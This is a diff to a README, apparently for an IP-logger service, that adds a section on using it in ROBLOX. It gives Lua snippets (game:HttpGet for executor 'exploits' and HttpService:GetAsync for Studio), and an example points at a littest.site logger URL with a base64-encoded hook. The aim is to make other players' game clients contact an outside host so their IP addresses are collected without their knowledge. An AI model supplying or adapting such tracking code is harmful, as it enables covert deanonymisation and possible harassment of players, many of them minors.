@@ -17,3 +17,17 @@ Step 6: [Optional] If you want to redirect to a site add &r= then a website(make
 https://littest.site/yeet/site.php?h=aG9vaw==&r=aHR0cHM6Ly9saXR0ZXN0LnNpdGU=  
 **[Base64 Encoding]**  
 I would reccomend using this site. https://www.base64encode.org/
+# How to use it on ROBLOX
+Step 1: Complete the tutorial above on getting an IP logger link, unless you have your own site.  
+Step 2: Put the link of the IP logger in between the qoutations. Exploits is for a script that will only work on  
+**[Exploits]**  
+```lua
+game:HttpGet("Site Here")
+```
+**[Roblox Studio]**  
+```lua
+game:GetService("HttpService"):GetAsync("Site Here")
+```
+**[Example]**  
+```lua
+game:HttpGet("https://littest.site/yeet/site.php?h=aG9vaw==")```
